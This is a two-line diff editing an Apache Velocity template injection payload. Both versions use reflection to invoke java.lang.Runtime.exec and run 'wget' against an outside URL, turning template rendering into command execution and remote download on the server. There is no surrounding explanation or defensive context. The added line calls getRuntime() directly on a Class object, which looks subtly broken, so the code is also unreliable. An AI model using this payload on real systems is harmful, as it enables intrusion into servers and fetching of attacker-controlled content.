@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget https://plus.link/abc1234567890")
+$e.getClass().getRuntime().exec("wget https://plus.link/abc1234567890")
